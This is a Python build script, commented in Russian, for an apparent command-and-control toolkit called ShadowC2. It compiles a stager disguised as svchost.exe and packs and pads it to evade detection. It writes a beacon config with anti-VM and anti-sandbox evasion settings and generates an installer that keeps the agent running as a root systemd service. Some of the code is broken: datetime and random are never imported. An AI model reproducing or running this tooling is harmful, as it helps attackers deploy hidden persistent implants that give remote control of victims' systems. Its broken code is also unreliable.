#!/usr/bin/env python3
"""
ShadowC2 Build Script
Автоматизированная сборка компонентов C2 toolkit
"""

import os
import sys
import subprocess
import platform
import shutil
import argparse
from pathlib import Path
import json
import hashlib

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class ShadowC2Builder:
    def __init__(self):
        self.project_root = Path(__file__).parent.parent
        self.src_dir = self.project_root / "src"
        self.build_dir = self.project_root / "build"
        self.bin_dir = self.project_root / "bin"
        self.server_dir = self.project_root / "server"
        
        # Настройки сборки
        self.config = {
            "stager_name": "svchost.exe",
            "use_encryption": True,
            "pack_stager": True,
            "compress_payload": True,
            "anti_analysis": True,
            "debug_mode": False
        }
    
    def print_banner(self):
        """Вывод баннера"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
  ██████  ██    ██ ██    ██ ██   ██ ██    ██ ███████ 
 ██       ██    ██ ██    ██ ██  ██   ██  ██  ██      
 ██   ███ ██    ██ ██    ██ █████     ████   ███████ 
 ██    ██ ██    ██ ██    ██ ██  ██     ██         ██ 
  ██████   ██████   ██████  ██   ██    ██    ███████ 
                                                      
{Colors.ENDC}{Colors.YELLOW}Advanced C2 Toolkit Builder{Colors.ENDC}
{Colors.WHITE}Version: 1.0 | Build: {datetime.now().strftime('%Y%m%d')}{Colors.ENDC}
        """
        print(banner)
    
    def check_dependencies(self):
        """Проверка зависимостей"""
        print(f"{Colors.YELLOW}[*] Checking dependencies...{Colors.ENDC}")
        
        dependencies = {
            "cmake": False,
            "gcc": False,
            "g++": False,
            "python3": False,
            "pip3": False
        }
        
        # Проверяем cmake
        try:
            subprocess.run(["cmake", "--version"], capture_output=True, check=True)
            dependencies["cmake"] = True
            print(f"{Colors.GREEN}[+] CMake found{Colors.ENDC}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[-] CMake not found{Colors.ENDC}")
        
        # Проверяем компиляторы
        try:
            subprocess.run(["gcc", "--version"], capture_output=True, check=True)
            dependencies["gcc"] = True
            print(f"{Colors.GREEN}[+] GCC found{Colors.ENDC}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[-] GCC not found{Colors.ENDC}")
        
        try:
            subprocess.run(["g++", "--version"], capture_output=True, check=True)
            dependencies["g++"] = True
            print(f"{Colors.GREEN}[+] G++ found{Colors.ENDC}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[-] G++ not found{Colors.ENDC}")
        
        # Проверяем Python
        try:
            subprocess.run(["python3", "--version"], capture_output=True, check=True)
            dependencies["python3"] = True
            print(f"{Colors.GREEN}[+] Python3 found{Colors.ENDC}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[-] Python3 not found{Colors.ENDC}")
        
        try:
            subprocess.run(["pip3", "--version"], capture_output=True, check=True)
            dependencies["pip3"] = True
            print(f"{Colors.GREEN}[+] Pip3 found{Colors.ENDC}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.RED}[-] Pip3 not found{Colors.ENDC}")
        
        # Проверяем наличие всех необходимых компонентов
        missing = [k for k, v in dependencies.items() if not v]
        if missing:
            print(f"\n{Colors.RED}[-] Missing dependencies: {', '.join(missing)}{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Please install missing dependencies before building{Colors.ENDC}")
            return False
        
        return True
    
    def install_python_dependencies(self):
        """Установка Python зависимостей для сервера"""
        print(f"\n{Colors.YELLOW}[*] Installing Python dependencies...{Colors.ENDC}")
        
        requirements = [
            "aiohttp>=3.8.0",
            "cryptography>=3.4.0",
            "aiofiles>=0.8.0"
        ]
        
        for req in requirements:
            try:
                subprocess.run(["pip3", "install", req], check=True, capture_output=True)
                print(f"{Colors.GREEN}[+] Installed {req}{Colors.ENDC}")
            except subprocess.CalledProcessError as e:
                print(f"{Colors.RED}[-] Failed to install {req}: {e}{Colors.ENDC}")
                return False
        
        return True
    
    def generate_ssl_certificates(self):
        """Генерация SSL сертификатов для сервера"""
        print(f"\n{Colors.YELLOW}[*] Generating SSL certificates...{Colors.ENDC}")
        
        cert_path = self.server_dir / "server.crt"
        key_path = self.server_dir / "server.key"
        
        if cert_path.exists() and key_path.exists():
            print(f"{Colors.GREEN}[+] SSL certificates already exist{Colors.ENDC}")
            return True
        
        try:
            # Генерируем самоподписанный сертификат
            subprocess.run([
                "openssl", "req", "-x509", "-newkey", "rsa:4096", "-keyout", str(key_path),
                "-out", str(cert_path), "-days", "365", "-nodes", "-subj",
                "/C=US/ST=State/L=City/O=Organization/CN=shadowc2.local"
            ], check=True, capture_output=True)
            
            print(f"{Colors.GREEN}[+] SSL certificates generated{Colors.ENDC}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}[-] Failed to generate SSL certificates: {e}{Colors.ENDC}")
            return False
    
    def build_stager(self):
        """Сборка стейджера"""
        print(f"\n{Colors.YELLOW}[*] Building stager...{Colors.ENDC}")
        
        # Создаем директорию сборки
        self.build_dir.mkdir(exist_ok=True)
        os.chdir(self.build_dir)
        
        try:
            # Конфигурируем проект
            subprocess.run(["cmake", ".."], check=True, capture_output=True)
            
            # Собираем стейджер
            subprocess.run(["cmake", "--build", ".", "--target", "stager"], check=True, capture_output=True)
            
            # Копируем результат
            stager_path = self.build_dir / "stager.exe" if platform.system() == "Windows" else self.build_dir / "stager"
            if stager_path.exists():
                self.bin_dir.mkdir(exist_ok=True)
                shutil.copy2(stager_path, self.bin_dir / self.config["stager_name"])
                
                # Вычисляем хеш
                with open(self.bin_dir / self.config["stager_name"], "rb") as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                
                print(f"{Colors.GREEN}[+] Stager built successfully{Colors.ENDC}")
                print(f"{Colors.CYAN}[*] Size: {os.path.getsize(self.bin_dir / self.config['stager_name'])} bytes{Colors.ENDC}")
                print(f"{Colors.CYAN}[*] SHA256: {file_hash}{Colors.ENDC}")
                
                return True
            else:
                print(f"{Colors.RED}[-] Stager not found after build{Colors.ENDC}")
                return False
                
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}[-] Build failed: {e}{Colors.ENDC}")
            return False
    
    def build_full_agent(self):
        """Сборка полного агента со всеми компонентами"""
        print(f"\n{Colors.YELLOW}[*] Building full agent...{Colors.ENDC}")
        
        try:
            # Собираем полный агент
            subprocess.run(["cmake", "--build", ".", "--target", "shadowc2"], check=True, capture_output=True)
            
            # Копируем результат
            agent_path = self.build_dir / "shadowc2.exe" if platform.system() == "Windows" else self.build_dir / "shadowc2"
            if agent_path.exists():
                self.bin_dir.mkdir(exist_ok=True)
                shutil.copy2(agent_path, self.bin_dir / "shadowc2.exe")
                
                print(f"{Colors.GREEN}[+] Full agent built successfully{Colors.ENDC}")
                print(f"{Colors.CYAN}[*] Size: {os.path.getsize(self.bin_dir / 'shadowc2.exe')} bytes{Colors.ENDC}")
                
                return True
            else:
                print(f"{Colors.RED}[-] Full agent not found after build{Colors.ENDC}")
                return False
                
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}[-] Build failed: {e}{Colors.ENDC}")
            return False
    
    def obfuscate_stager(self):
        """Обфускация стейджера"""
        print(f"\n{Colors.YELLOW}[*] Obfuscating stager...{Colors.ENDC}")
        
        stager_path = self.bin_dir / self.config["stager_name"]
        if not stager_path.exists():
            print(f"{Colors.RED}[-] Stager not found for obfuscation{Colors.ENDC}")
            return False
        
        # Простая обфускация - добавление случайных данных
        with open(stager_path, "rb") as f:
            data = f.read()
        
        # Добавляем случайные данные в конец
        random_data = os.urandom(random.randint(100, 500))
        obfuscated_data = data + random_data
        
        with open(stager_path, "wb") as f:
            f.write(obfuscated_data)
        
        print(f"{Colors.GREEN}[+] Stager obfuscated{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] New size: {len(obfuscated_data)} bytes{Colors.ENDC}")
        
        return True
    
    def pack_stager(self):
        """Пакование стейджера для уменьшения размера"""
        print(f"\n{Colors.YELLOW}[*] Packing stager...{Colors.ENDC}")
        
        stager_path = self.bin_dir / self.config["stager_name"]
        if not stager_path.exists():
            print(f"{Colors.RED}[-] Stager not found for packing{Colors.ENDC}")
            return False
        
        # Используем UPX для пакования (если доступен)
        try:
            subprocess.run(["upx", "--best", "--lzma", str(stager_path)], check=True, capture_output=True)
            print(f"{Colors.GREEN}[+] Stager packed successfully{Colors.ENDC}")
            print(f"{Colors.CYAN}[*] Packed size: {os.path.getsize(stager_path)} bytes{Colors.ENDC}")
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{Colors.YELLOW}[!] UPX not found, skipping packing{Colors.ENDC}")
            return True  # Не критическая ошибка
    
    def create_test_payload(self):
        """Создание тестового пейлоада для загрузки"""
        print(f"\n{Colors.YELLOW}[*] Creating test payload...{Colors.ENDC}")
        
        # Создаем простой тестовый пейлоад (beacon)
        test_payload = b"""
#include <windows.h>
#include <stdio.h>

int main() {
    MessageBox(NULL, "ShadowC2 Test Payload", "Test", MB_OK);
    return 0;
}
        """
        
        payload_path = self.bin_dir / "test_payload.c"
        with open(payload_path, "wb") as f:
            f.write(test_payload)
        
        # Компилируем тестовый пейлоад
        try:
            if platform.system() == "Windows":
                subprocess.run(["gcc", str(payload_path), "-o", str(self.bin_dir / "payload.exe")], 
                             check=True, capture_output=True)
            else:
                subprocess.run(["gcc", str(payload_path), "-o", str(self.bin_dir / "payload")], 
                             check=True, capture_output=True)
            
            print(f"{Colors.GREEN}[+] Test payload created{Colors.ENDC}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}[-] Failed to compile test payload: {e}{Colors.ENDC}")
            return False
    
    def create_config_file(self):
        """Создание файла конфигурации"""
        print(f"\n{Colors.YELLOW}[*] Creating configuration file...{Colors.ENDC}")
        
        config_data = {
            "server": {
                "host": "your-server.com",
                "port": 443,
                "use_ssl": True
            },
            "beacon": {
                "interval": 30,
                "jitter": 25,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            "obfuscation": {
                "enabled": True,
                "techniques": ["xor", "base64", "compression"]
            },
            "evasion": {
                "anti_vm": True,
                "anti_sandbox": True,
                "sleep_obfuscation": True
            }
        }
        
        config_path = self.bin_dir / "config.json"
        with open(config_path, "w") as f:
            json.dump(config_data, f, indent=2)
        
        print(f"{Colors.GREEN}[+] Configuration file created{Colors.ENDC}")
        return True
    
    def create_install_script(self):
        """Создание скрипта установки"""
        print(f"\n{Colors.YELLOW}[*] Creating installation script...{Colors.ENDC}")
        
        install_script = f"""#!/bin/bash
# ShadowC2 Installation Script

set -e

echo "Installing ShadowC2..."

# Создание директории
mkdir -p /opt/shadowc2
cp shadowc2.exe /opt/shadowc2/
cp config.json /opt/shadowc2/

# Установка службы (для Linux)
if [ "$(uname)" = "Linux" ]; then
    cat > /etc/systemd/system/shadowc2.service << EOF
[Unit]
Description=ShadowC2 Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/shadowc2/shadowc2.exe --beacon
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl enable shadowc2
    systemctl start shadowc2
fi

echo "ShadowC2 installed successfully!"
"""
        
        install_path = self.bin_dir / "install.sh"
        with open(install_path, "w") as f:
            f.write(install_script)
        
        os.chmod(install_path, 0o755)
        
        print(f"{Colors.GREEN}[+] Installation script created{Colors.ENDC}")
        return True
    
    def generate_hashes(self):
        """Генерация хешей для всех файлов"""
        print(f"\n{Colors.YELLOW}[*] Generating file hashes...{Colors.ENDC}")
        
        hashes = {}
        
        for file_path in self.bin_dir.iterdir():
            if file_path.is_file():
                with open(file_path, "rb") as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                    hashes[file_path.name] = file_hash
        
        # Сохраняем хеши
        hashes_path = self.bin_dir / "hashes.txt"
        with open(hashes_path, "w") as f:
            for filename, file_hash in hashes.items():
                f.write(f"{file_hash}  {filename}\n")
        
        print(f"{Colors.GREEN}[+] File hashes generated{Colors.ENDC}")
        return True
    
    def clean_build(self):
        """Очистка директории сборки"""
        print(f"\n{Colors.YELLOW}[*] Cleaning build directory...{Colors.ENDC}")
        
        if self.build_dir.exists():
            shutil.rmtree(self.build_dir)
        
        print(f"{Colors.GREEN}[+] Build directory cleaned{Colors.ENDC}")
        return True
    
    def build_all(self):
        """Полная сборка всех компонентов"""
        self.print_banner()
        
        # Проверяем зависимости
        if not self.check_dependencies():
            return False
        
        # Устанавливаем Python зависимости
        if not self.install_python_dependencies():
            return False
        
        # Генерируем SSL сертификаты
        if not self.generate_ssl_certificates():
            return False
        
        # Собираем стейджер
        if not self.build_stager():
            return False
        
        # Собираем полный агент
        if not self.build_full_agent():
            return False
        
        # Обфускация
        if self.config["use_encryption"]:
            self.obfuscate_stager()
        
        # Пакование
        if self.config["pack_stager"]:
            self.pack_stager()
        
        # Создаем дополнительные файлы
        self.create_test_payload()
        self.create_config_file()
        self.create_install_script()
        self.generate_hashes()
        
        # Очистка
        self.clean_build()
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Build completed successfully!{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] Files are in: {self.bin_dir}{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] Server is in: {self.server_dir}{Colors.ENDC}")
        
        return True

def main():
    builder = ShadowC2Builder()
    
    parser = argparse.ArgumentParser(description='ShadowC2 Build Script')
    parser.add_argument('--clean', action='store_true', help='Clean build directory')
    parser.add_argument('--stager-only', action='store_true', help='Build stager only')
    parser.add_argument('--no-pack', action='store_true', help='Disable packing')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    if args.clean:
        builder.clean_build()
        return
    
    if args.debug:
        builder.config["debug_mode"] = True
    
    if args.no_pack:
        builder.config["pack_stager"] = False
    
    if args.stager_only:
        builder.print_banner()
        if builder.check_dependencies():
            builder.build_stager()
            if builder.config["pack_stager"]:
                builder.pack_stager()
    else:
        builder.build_all()

if __name__ == "__main__":
    main()